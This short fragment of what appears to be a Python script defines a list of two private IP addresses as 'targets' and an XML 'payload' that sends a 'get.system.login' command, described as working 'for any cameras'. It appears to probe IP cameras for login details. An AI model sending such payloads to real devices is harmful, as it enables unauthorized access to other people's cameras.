...
targets = ['192.168.88.20','192.168.88.21'] # Targets list
...
payload = "<?xml version='1.0' encoding='utf-8'?>\n<envelope><header><security>username</security></header><body><command>get.system.login</command><content></content></body></envelope>" # payload for any cameras (For falcon use from falcon dir)
